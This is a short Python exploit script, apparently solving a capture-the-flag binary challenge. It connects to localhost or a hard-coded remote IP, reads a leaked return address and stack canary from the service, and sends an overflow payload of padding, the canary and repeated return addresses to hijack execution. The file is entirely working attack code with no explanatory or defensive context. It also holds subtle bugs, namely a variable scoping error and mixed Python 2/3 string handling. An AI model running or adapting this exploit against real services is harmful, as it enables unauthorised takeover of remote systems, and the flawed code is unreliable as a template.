import socket
import struct
import sys

target_addr = "localhost"
target_port = 10003

def main():
	if sys.argv[1] == '-r':
		target_addr = "133.130.115.234"

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_addr,target_port))
	str = s.recv(34)
	print(str)
	hex = int(str[24:34],16)
	print(hex)
	ra = struct.pack("<I",hex)
	#print "[+] Return Address = %x" % ra
	str = s.recv(1024)
	print("str",str)
	hex = int(str[9:19],16)
	canary = struct.pack("<I",hex)
	str = "{0:X}".format(hex)
	print(str)
	buf = 'A' * 20
	buf += canary
	buf += ra
	buf += ra
	buf += ra
	buf += ra
	buf += "\n"
	s.send(buf);
	str = s.recv(1024)
	print(str)


if __name__ == '__main__':
	main()
